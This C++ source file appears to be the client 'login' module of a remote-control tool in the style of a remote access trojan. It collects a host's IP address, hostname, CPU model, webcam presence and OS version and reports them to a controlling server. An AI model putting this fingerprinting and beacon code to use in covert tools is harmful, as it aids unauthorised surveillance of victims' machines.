#include "Login.h"


int  SendLoginInformation(_CIOCPClient*  IOCPClient, DWORD   WedSpeed)
{
	NTSTATUS   Status;
	LOGIN_INFORMATION   LoginInfo = { 0 };
	LoginInfo.IsToken = CLIENT_LOGIN;

	//获取当前客户端的IP地址
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(sockaddr_in));
	int  ClientAddressLength = sizeof(sockaddr_in);
	getsockname(IOCPClient->m_ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength);
	LoginInfo.ClientAddress = ClientAddress.sin_addr;

	//获取当前客户端的主机名
	gethostname(LoginInfo.HostName, MAX_PATH);

	//获取当前客户端的CPU型号
	ULONG  ProcessoeNameStringLength = MAX_PATH;
	Status = GetProcessNameString(LoginInfo.ProcessorNameString, &ProcessoeNameStringLength);

	//判断当前客户端有无摄像头
	LoginInfo.IsWebCameraExist = IsWebCamera();

	//获取当前客户端系统版本信息
	LoginInfo.OsVersionInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO*)&LoginInfo.OsVersionInfoEx);

	int ReturnLength = 0;
	ReturnLength = IOCPClient->OnSending((char*)&LoginInfo, sizeof(LOGIN_INFORMATION));
	return  ReturnLength;

}
NTSTATUS  GetProcessNameString(char* ProcessorNameString, ULONG* ProcessoeNameStringLength)
{
	HKEY   KeyHandle;
	NTSTATUS  Status;
	DWORD   Type = REG_SZ;
	Status = RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
		&KeyHandle);
	if (Status != ERROR_SUCCESS)
	{
		return Status;
	}
	Status = RegQueryValueEx(KeyHandle, "ProcessorNameString",
		NULL, &Type, (LPBYTE)ProcessorNameString, ProcessoeNameStringLength);
	RegCloseKey(KeyHandle);
	return Status;
}
BOOL      IsWebCamera()
{
	BOOL  IsOk = FALSE;
	CHAR  DriveName[MAX_PATH];
	//请求设备
	for (int i = 0; i < 10 && !IsOk; i++)
	{
		IsOk = capGetDriverDescription(i, DriveName, sizeof(DriveName), NULL, 0);
	}
	return  IsOk;
}